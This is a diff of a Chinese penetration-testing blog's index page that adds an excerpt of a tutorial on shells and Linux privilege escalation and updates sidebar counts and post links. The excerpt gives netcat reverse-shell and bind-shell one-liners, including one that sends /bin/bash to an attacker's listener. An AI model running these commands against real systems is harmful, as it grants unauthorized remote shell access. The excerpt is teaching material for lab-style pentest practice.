@@ -137,6 +137,46 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/01/15/Shell与Linux常见权限提升技术/" title="更新">Shell与Linux常见权限提升技术</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-01-15  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><img src="/PenTest_FILE/f359dc9b359137fc0a67464fef1365fd_MD5.jpeg"></p>
+<h1 id="一、shell是什么"><a href="#一、shell是什么" class="headerlink" title="一、shell是什么"></a>一、shell是什么</h1><h2 id="Shell的类型"><a href="#Shell的类型" class="headerlink" title="Shell的类型"></a>Shell的类型</h2><blockquote>
+<p>在高层次上，当涉及到利用目标时，我们对两种 shell 感兴趣：反向 shell 和绑定 shell。</p>
+</blockquote>
+<ul>
+<li>Reverse shells<br>反向 shell 是指强制目标执行连接回计算机的代码，在攻击机上设置接受连接的侦听器。<br>反向 shell 是绕过防火墙规则的好方法，因为这些规则可能会阻止您连接到目标上的任意端口。但缺点是，当通过 Internet 从计算机接收 shell 时，您需要配置自己的网络以接受 shell。</li>
+</ul>
+<p>以下是一个linux的反向shell例子：</p>
+<p>攻击机<code>sudo nc -lvnp 443</code>监听端口，靶机<code>nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code>连接我们的ip和监听端口<br><img src="/PenTest_FILE/8986b480d2916588fe9ae5361abb94bc_MD5.jpeg"></p>
+<ul>
+<li>Bind shells<br>绑定 shell 是指使用在目标上执行的代码来启动直接在目标上附加到 shell 的侦听器。<br>这将向互联网开放，这意味着您可以连接到代码已打开的端口，并以这种方式获得远程代码执行。这样做的优点是不需要在您自己的网络上进行任何配置，但缺点是可以通过保护目标的防火墙来阻止。</li>
+</ul>
+<p>以下是一个windows的绑定shell例子：<br>靶机<code>nc -lvnp &lt;port&gt; -e &quot;cmd.exe&quot;</code>在本地开放端口，攻击机<code>nc MACHINE_IP &lt;port&gt;</code>去连接靶机的该端口<br><img src="/PenTest_FILE/d0ca8083ce4908d80fad645da9518acb_MD5.jpeg"></p>
+<hr>
+	
+	</div>
+  <a type="button" href="/2024/01/15/Shell与Linux常见权限提升技术/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2023/12/31/Basic Pentesting/" title="再见，2023">Basic Pentesting</a>
 		</h3>
 		</div>
@@ -700,7 +740,7 @@ qemu-system-x86_64 <span class="token parameter variable">-initrd</span> core.cp
 		
 			<li><a href="/categories/赛题/">赛题<span>10</span></a></li>
 		
-			<li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>8</span></a></li>
+			<li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>9</span></a></li>
 		
 		</ul>
 	</div>
@@ -713,11 +753,11 @@ qemu-system-x86_64 <span class="token parameter variable">-initrd</span> core.cp
 		
 			<li><a href="/tags/Linux-Kernel-pwn/">Linux Kernel pwn<span>7</span></a></li>
 		
+			<li><a href="/tags/渗透打靶/">渗透打靶<span>7</span></a></li>
+		
 			<li><a href="/tags/Windows-pwn/">Windows pwn<span>1</span></a></li>
 		
 			<li><a href="/tags/IOT/">IOT<span>2</span></a></li>
-		
-			<li><a href="/tags/渗透打靶/">渗透打靶<span>6</span></a></li>
 		
 		 
 		</ul>
@@ -735,6 +775,10 @@ qemu-system-x86_64 <span class="token parameter variable">-initrd</span> core.cp
       </li>
     
       <li>
+        <a href="/2024/07/10/Alfred/" ><i class="fa fa-file-o"></i>Alfred</a>
+      </li>
+    
+      <li>
         <a href="/2024/07/09/强网杯2020 easyoverflow/"  title="I hate windows" ><i class="fa fa-file-o"></i>强网杯2020 easyoverflow</a>
       </li>
     
@@ -744,10 +788,6 @@ qemu-system-x86_64 <span class="token parameter variable">-initrd</span> core.cp
     
       <li>
         <a href="/2024/06/29/Steel Mountain/" ><i class="fa fa-file-o"></i>Steel Mountain</a>
-      </li>
-    
-      <li>
-        <a href="/2024/06/24/CISCN2024华中赛区选拔赛/"  title="赛完就回去考试，重生之我是特种兵" ><i class="fa fa-file-o"></i>CISCN2024华中赛区选拔赛</a>
       </li>
     
   </ul>
